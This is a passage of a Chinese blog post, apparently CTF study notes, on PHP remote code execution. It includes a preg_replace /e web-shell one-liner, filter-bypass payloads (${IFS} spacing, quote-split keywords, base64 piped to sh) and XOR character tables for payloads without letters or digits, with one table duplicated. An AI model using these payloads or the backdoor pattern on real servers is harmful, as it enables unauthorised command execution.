single-quoted-string">'/abc/e'</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>$_REQUEST  包含GET,POST,COOKIE方法</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phphighlight_file(__FILE__);$cmd &#x3D; $_GET[&#39;cmd&#39;];preg_replace(&#39;&#x2F;&lt;data&gt;(.*)&lt;\&#x2F;data&gt;&#x2F;e&#39;,&#39;$ret&#x3D;&quot;\\1&quot;&#39;,$cmd);     echo $ret;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过</p><pre class="line-numbers language-none"><code class="language-none">?cmd&#x3D;&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><p>[PHP执行系统外部命令:exec()、passthru()、system()、shell_exec()</p><p><a href="http://hi.baidu.com/cszhi/item/d71d61f22feefe16ce9f32d1"><a href="https://www.php.net/manual/zh/ref.exec.php">官方文档</a></a></p><p><img src="/2023/03/15/RCE/image-20221215114124054.png"></p><pre class="line-numbers language-none"><code class="language-none">exec()函数无回显因为exec没有回显，所以可以存入文件中，或借助print_r进行输出 使用姿势：echo exec(&quot;ls&quot;,$file); exec(print_r(system(ls))); &#x2F;&#x2F;system和print_r 都可以替换为作用相似的函数使用或者使用linux命令tee内容写入到文件中ls  | tee 1.txt然后访问1.txt就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">linux%09(tap)    &#123;cat,flag.txt&#125; cat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txtkg&#x3D;$&#39;\x20flag.txt&#39;&amp;&amp;cat$kg(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)windows下（实用性不是很广，也就type这个命令可以用）type.\flag.txttype,flag.txtecho,123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-关键字被过滤"><a href="#2-关键字被过滤" class="headerlink" title="2.关键字被过滤"></a>2.关键字被过滤</h3><ul><li><p>可以采用重命名变量然后拼接  </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">eg<span class="token operator">.</span>过滤了lsa<span class="token operator">=</span>l<span class="token punctuation">;</span>b<span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>采用base64的方法绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string backtick-quoted-string">`base64内容 | base64 -d`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">汇总几种关键字绕过方式 以flag为例* 单引号绕过 fla&#39;g&#39;* 双引号绕过 fla&quot;g&quot;* 反斜线绕过 f\lag* 变量拼接绕过 a&#x3D;g;cat$IFS$1fla$a.php* $+任意数字绕过 fl$1ag * Base64绕过 cat flag.php 的base64编码为Y2F0IGZsYWcucGhw  echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh* 内联绕过 就是将反引号内命令的输出作为输入执行  cat &#96;ls&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="命令执行相关内容"><a href="#命令执行相关内容" class="headerlink" title="命令执行相关内容"></a>命令执行相关内容</h2><h3 id="拼接符"><a href="#拼接符" class="headerlink" title="拼接符"></a>拼接符</h3><pre class="line-numbers language-none"><code class="language-none">&amp; ：前面和后面命令都要执行，无论前面真假&amp;&amp;： 表示前一条命令执行成功时，才执行后一条命令| ：直接执行后面的语句|| ：表示上一条命令执行失败后，才执行下一条命令; ：表示命令依次执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><pre class="line-numbers language-none"><code class="language-none">表达式 .*就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串,以第一个a开始，最后一个b结束。如果用它来搜索aabab的话，它会匹配整个字符串aabab。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ls-cat"><a href="#ls-cat" class="headerlink" title="ls  cat"></a>ls  cat</h3><pre class="line-numbers language-none"><code class="language-none">ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。如果cat被过滤，可以用下边的方法进行绕过(1)more:一页一页的显示档案内容(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页(3)head:查看头几行(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示(5)tail:查看尾几行(6)nl：显示的时候，顺便输出行号(7)od:以二进制的方式读取档案内容(8)vi:一种编辑器，这个也可以查看(9)vim:一种编辑器，这个也可以查看(10)sort:可以查看(11)uniq:可以查看(12)file -f:报错出具体内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><pre class="line-numbers language-none"><code class="language-none">将指定的函数体插入并取代每一处调用该函数的地方。反引号 在linux中作为内联执行，执行输出结果。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="无数字和字母RCE、"><a href="#无数字和字母RCE、" class="headerlink" title="无数字和字母RCE、"></a>无数字和字母RCE、</h2><h3 id="1-异或绕过"><a href="#1-异或绕过" class="headerlink" title="1.异或绕过"></a>1.异或绕过</h3><p><img src="/2023/03/15/RCE/image-20221215225144269.png" alt="image-20221215225144269"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$code</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z0-9]+/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用没有被过滤的符号异或生成对应的字母</p><p>异或结果没有是数字的</p><p>python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token string">'-~@#$%^&amp;*_+|/?.,&lt;>`&#123;&#125;[]()'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">64</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">91</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'i ^ j = '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">96</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">123</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'i ^ j = '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token string">'-~@#$%^&amp;*_+|/?.,&lt;>`&#123;&#125;[]()'</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> c<span class="token punctuation">:</span>            <span class="token comment"># print(ord(i) ^ ord(j))</span>            <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> c<span class="token punctuation">:</span>            <span class="token comment"># print(ord(i) ^ ord(j))</span>            <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">~ ^ ? &#x3D; A 65 ? ^ ~ &#x3D; A 65&lt; ^ &#125; &#x3D; A 65&#125; ^ &lt; &#x3D; A 65~ ^ &lt; &#x3D; B 66| ^ &gt; &#x3D; B 66? ^ &#125; &#x3D; B 66&lt; ^ ~ &#x3D; B 66&gt; ^ | &#x3D; B 66&#125; ^ ? &#x3D; B 66# ^ &#96; &#x3D; C 67| ^ ? &#x3D; C 67? ^ | &#x3D; C 67&gt; ^ &#125; &#x3D; C 67&#96; ^ # &#x3D; C 67&#125; ^ &gt; &#x3D; C 67$ ^ &#96; &#x3D; D 68? ^ &#123; &#x3D; D 68&#96; ^ $ &#x3D; D 68&#123; ^ ? &#x3D; D 68% ^ &#96; &#x3D; E 69&gt; ^ &#123; &#x3D; E 69&#96; ^ % &#x3D; E 69&#123; ^ &gt; &#x3D; E 69&amp; ^ &#96; &#x3D; F 70&#96; ^ &amp; &#x3D; F 70&lt; ^ &#123; &#x3D; G 71&#123; ^ &lt; &#x3D; G 71&#96; ^ ( &#x3D; H 72( ^ &#96; &#x3D; H 72&#96; ^ ) &#x3D; I 73) ^ &#96; &#x3D; I 73* ^ &#96; &#x3D; J 74&#96; ^ * &#x3D; J 74+ ^ &#96; &#x3D; K 75&#96; ^ + &#x3D; K 75, ^ &#96; &#x3D; L 76&#96; ^ , &#x3D; L 76- ^ &#96; &#x3D; M 77&#96; ^ - &#x3D; M 77. ^ &#96; &#x3D; N 78&#96; ^ . &#x3D; N 78&#x2F; ^ &#96; &#x3D; O 79&#96; ^ &#x2F; &#x3D; O 79- ^ &#125; &#x3D; P 80~ ^ . &#x3D; P 80+ ^ &#123; &#x3D; P 80| ^ , &#x3D; P 80. ^ ~ &#x3D; P 80, ^ | &#x3D; P 80&#123; ^ + &#x3D; P 80&#125; ^ - &#x3D; P 80- ^ | &#x3D; Q 81~ ^ &#x2F; &#x3D; Q 81* ^ &#123; &#x3D; Q 81| ^ - &#x3D; Q 81&#x2F; ^ ~ &#x3D; Q 81, ^ &#125; &#x3D; Q 81&#123; ^ * &#x3D; Q 81&#125; ^ , &#x3D; Q 81~ ^ , &#x3D; R 82| ^ . &#x3D; R 82&#x2F; ^ &#125; &#x3D; R 82. ^ | &#x3D; R 82, ^ ~ &#x3D; R 82&#123; ^ ) &#x3D; R 82&#125; ^ &#x2F; &#x3D; R 82) ^ &#123; &#x3D; R 82- ^ ~ &#x3D; S 83~ ^ - &#x3D; S 83| ^ &#x2F; &#x3D; S 83&#x2F; ^ | &#x3D; S 83. ^ &#125; &#x3D; S 83&#123; ^ ( &#x3D; S 83&#125; ^ . &#x3D; S 83( ^ &#123; &#x3D; S 83~ ^ * &#x3D; T 84* ^ ~ &#x3D; T 84| ^ ( &#x3D; T 84&#x2F; ^ &#123; &#x3D; T 84&#123; ^ &#x2F; &#x3D; T 84&#125; ^ ) &#x3D; T 84( ^ | &#x3D; T 84) ^ &#125; &#x3D; T 84~ ^ + &#x3D; U 85+ ^ ~ &#x3D; U 85| ^ ) &#x3D; U 85. ^ &#123; &#x3D; U 85&#123; ^ . &#x3D; U 85&#125; ^ ( &#x3D; U 85( ^ &#125; &#x3D; U 85) ^ | &#x3D; U 85- ^ &#123; &#x3D; V 86~ ^ ( &#x3D; V 86* ^ | &#x3D; V 86+ ^ &#125; &#x3D; V 86| ^ * &#x3D; V 86&#123; ^ - &#x3D; V 86&#125; ^ + &#x3D; V 86( ^ ~ &#x3D; V 86~ ^ ) &#x3D; W 87* ^ &#125; &#x3D; W 87+ ^ | &#x3D; W 87| ^ + &#x3D; W 87, ^ &#123; &#x3D; W 87&#123; ^ , &#x3D; W 87&#125; ^ * &#x3D; W 87) ^ ~ &#x3D; W 87~ ^ &amp; &#x3D; X 88# ^ &#123; &#x3D; X 88$ ^ | &#x3D; X 88% ^ &#125; &#x3D; X 88&amp; ^ ~ &#x3D; X 88| ^ $ &#x3D; X 88&#123; ^ # &#x3D; X 88&#125; ^ % &#x3D; X 88$ ^ &#125; &#x3D; Y 89% ^ | &#x3D; Y 89| ^ % &#x3D; Y 89&#125; ^ $ &#x3D; Y 89~ ^ $ &#x3D; Z 90$ ^ ~ &#x3D; Z 90&amp; ^ | &#x3D; Z 90| ^ &amp; &#x3D; Z 90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">^ ^ ? &#x3D; a 97_ ^ &gt; &#x3D; a 97? ^ ^ &#x3D; a 97&lt; ^ ] &#x3D; a 97&gt; ^ _ &#x3D; a 97] ^ &lt; &#x3D; a 97^ ^ &lt; &#x3D; b 98? ^ ] &#x3D; b 98&lt; ^ ^ &#x3D; b 98] ^ ? &#x3D; b 98@ ^ # &#x3D; c 99# ^ @ &#x3D; c 99_ ^ &lt; &#x3D; c 99&lt; ^ _ &#x3D; c 99&gt; ^ ] &#x3D; c 99] ^ &gt; &#x3D; c 99@ ^ $ &#x3D; d 100$ ^ @ &#x3D; d 100? ^ [ &#x3D; d 100[ ^ ? &#x3D; d 100@ ^ % &#x3D; e 101% ^ @ &#x3D; e 101&gt; ^ [ &#x3D; e 101[ ^ &gt; &#x3D; e 101@ ^ &amp; &#x3D; f 102&amp; ^ @ &#x3D; f 102&lt; ^ [ &#x3D; g 103[ ^ &lt; &#x3D; g 103@ ^ ( &#x3D; h 104( ^ @ &#x3D; h 104@ ^ ) &#x3D; i 105) ^ @ &#x3D; i 105@ ^ * &#x3D; j 106* ^ @ &#x3D; j 106@ ^ + &#x3D; k 107+ ^ @ &#x3D; k 107@ ^ , &#x3D; l 108, ^ @ &#x3D; l 108- ^ @ &#x3D; m 109@ ^ - &#x3D; m 109@ ^ . &#x3D; n 110. ^ @ &#x3D; n 110@ ^ &#x2F; &#x3D; o 111&#x2F; ^ @ &#x3D; o 111- ^ ] &#x3D; p 112^ ^ . &#x3D; p 112_ ^ &#x2F; &#x3D; p 112+ ^ [ &#x3D; p 112&#x2F; ^ _ &#x3D; p 112. ^ ^ &#x3D; p 112[ ^ + &#x3D; p 112] ^ - &#x3D; p 112^ ^ &#x2F; &#x3D; q 113* ^ [ &#x3D; q 113_ ^ . &#x3D; q 113&#x2F; ^ ^ &#x3D; q 113. ^ _ &#x3D; q 113, ^ ] &#x3D; q 113[ ^ * &#x3D; q 113] ^ , &#x3D; q 113- ^ _ &#x3D; r 114^ ^ , &#x3D; r 114_ ^ - &#x3D; r 114&#x2F; ^ ] &#x3D; r 114, ^ ^ &#x3D; r 114[ ^ ) &#x3D; r 114] ^ &#x2F; &#x3D; r 114) ^ [ &#x3D; r 114- ^ ^ &#x3D; s 115^ ^ - &#x3D; s 115_ ^ , &#x3D; s 115. ^ ] &#x3D; s 115, ^ _ &#x3D; s 115[ ^ ( &#x3D; s 115] ^ . &#x3D; s 115( ^ [ &#x3D; s 115^ ^ * &#x3D; t 116* ^ ^ &#x3D; t 116_ ^ + &#x3D; t 116+ ^ _ &#x3D; t 116&#x2F; ^ [ &#x3D; t 116[ ^ &#x2F; &#x3D; t 116] ^ ) &#x3D; t 116) ^ ] &#x3D; t 116^ ^ + &#x3D; u 117* ^ _ &#x3D; u 117_ ^ * &#x3D; u 117+ ^ ^ &#x3D; u 117. ^ [ &#x3D; u 117[ ^ . &#x3D; u 117] ^ ( &#x3D; u 117( ^ ] &#x3D; u 117- ^ [ &#x3D; v 118^ ^ ( &#x3D; v 118_ ^ ) &#x3D; v 118+ ^ ] &#x3D; v 118[ ^ - &#x3D; v 118] ^ + &#x3D; v 118( ^ ^ &#x3D; v 118) ^ _ &#x3D; v 118^ ^ ) &#x3D; w 119* ^ ] &#x3D; w 119_ ^ ( &#x3D; w 119, ^ [ &#x3D; w 119[ ^ , &#x3D; w 119] ^ * &#x3D; w 119( ^ _ &#x3D; w 119) ^ ^ &#x3D; w 119# ^ [ &#x3D; x 120% ^ ] &#x3D; x 120^ ^ &amp; &#x3D; x 120&amp; ^ ^ &#x3D; x 120[ ^ # &#x3D; x 120] ^ % &#x3D; x 120$ ^ ] &#x3D; y 121&amp; ^ _ &#x3D; y 121_ ^ &amp; &#x3D; y 121] ^ $ &#x3D; y 121$ ^ ^ &#x3D; z 122% ^ _ &#x3D; z 122^ ^ $ &#x3D; z 122_ ^ % &#x3D; z 122<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">^ ^ ? &#x3D; a 97_ ^ &gt; &#x3D; a 97? ^ ^ &#x3D; a 97&lt; ^ ] &#x3D; a 97&gt; ^ _ &#x3D; a 97] ^ &lt; &#x3D; a 97^ ^ &lt; &#x3D; b 98? ^ ] &#x3D; b 98&lt; ^ ^ &#x3D; b 98] ^ ? &#x3D; b 98@ ^ # &#x3D; c 99# ^ @ &#x3D; c 99_ ^ &lt; &#x3D; c 99&lt; ^ _ &#x3D; c 99&gt; ^ ] &#x3D; c 99] ^ &gt; &#x3D; c 99@ ^ $ &#x3D; d 100$ ^ @ &#x3D; d 100? ^ [ &#x3D; d 100[ ^ ? &#x3D; d 100@ ^ % &#x3D; e 101% ^ @ &#x3D; e 101&gt; ^ [ &#x3D; e 101[ ^ &gt; &#x3D; e 101@ ^ &amp; &#x3D; f 102&amp; ^ @ &#x3D; f 102&lt; ^ [ &#x3D; g 103[ ^ &lt; &#x3D; g 103@ ^ ( &#x3D; h 104( ^ @ &#x3D; h 104@ ^ ) &#x3D; i 105) ^ @ &#x3D; i 105@ ^ * &#x3D; j 106* ^ @ &#x3D; j 106@ ^ + &#x3D; k 107+ ^ @ &#x3D; k 107@ ^ , &#x3D; l 108, ^ @ &#x3D; l 108- ^ @ &#x3D; m 109@ ^ - &#x3D; m 109@ ^ . &#x3D; n 110. ^ @ &#x3D; n 110@ ^ &#x2F; &#x3D; o 111&#x2F; ^ @ &#x3D; o 111- ^ ] &#x3D; p 112^ ^ . &#x3D; p 112_ ^ &#x2F; &#x3D; p 112+ ^ [ &#x3D; p 112&#x2F; ^ _ &#x3D; p 112. ^ ^ &#x3D; p 112[ ^ + &#x3D; p 112] ^ - &#x3D; p 112^ ^ &#x2F; &#x3D; q 113* ^ [ &#x3D; q 113_ ^ . &#x3D; q 113&#x2F; ^ ^ &#x3D; q 113. ^ _ &#x3D; q 113, ^ ] &#x3D; q 113[ ^ * &#x3D; q 113] ^ , &#x3D; q 113- ^ _ &#x3D; r 114^ ^ , &#x3D; r 114_ ^ - &#x3D; r 114&#x2F; ^ ] &#x3D; r 114, ^ ^ &#x3D; r 114[ ^ ) &#x3D; r 114] ^ &#x2F; &#x3D; r 114) ^ [ &#x3D; r 114- ^ ^ &#x3D; s 115^ ^ - &#x3D; s 115_ ^ , &#x3D; s 115. ^ ] &#x3D; s 115, ^ _ &#x3D; s 115[ ^ ( &#x3D; s 115] ^ . &#x3D; s 115( ^ [ &#x3D; s 115^ ^ * &#x3D; t 116* ^ ^ &#x3D; t 116_ ^ + &#x3D; t 116+ ^ _ &#x3D; t 116&#x2F; ^ [ &#x3D; t 116[ ^ &#x2F; &#x3D; t 116] ^ ) &#x3D; t 116) ^ ] &#x3D; t 116^ ^ + &#x3D; u 117* ^ _ &#x3D; u 117_ ^ * &#x3D; u 117+ ^ ^ &#x3D; u 117. ^ [ &#x3D; u 117[ ^ . &#x3D; u 117] ^ ( &#x3D; u 117( ^ ] &#x3D; u 117- ^ [ &#x3D; v 118^ ^ ( &#x3D; v 118_ ^ ) &#x3D; v 118+ ^ ] &#x3D; v 118[ ^ - &#x3D; v 118] ^ + &#x3D; v 118( ^ ^ &#x3D; v 118) ^ _ &#x3D; v 118^ ^ ) &#x3D; w 119* ^ ] &#x3D; w 119_ ^ ( &#x3D; w 119, ^ [ &#x3D; w 119[ ^ , &#x3D; w 119] ^ * &#x3D; w 119( ^ _ &#x3D; w 119) ^ ^ &#x3D; w 119# ^ [ &#x3D; x 120% ^ ] &#x3D; x 120^ ^ &amp; &#x3D; x 120&amp; ^ ^ &#x3D; x 120[ ^ # &#x3D; x 120] ^ % &#x3D; x 120$ ^ ] &#x3D; y 121&amp; ^ _ &#x3D; y 121_ ^ &amp; &#x3D; y 121] ^ $ &#x3D; y 121$ ^ ^ &#x3D; z 122% ^ _ &#x3D; z 122^ ^ $ &#x3D; z 122_ ^ % &#x3D; z 122<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如  flag</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code 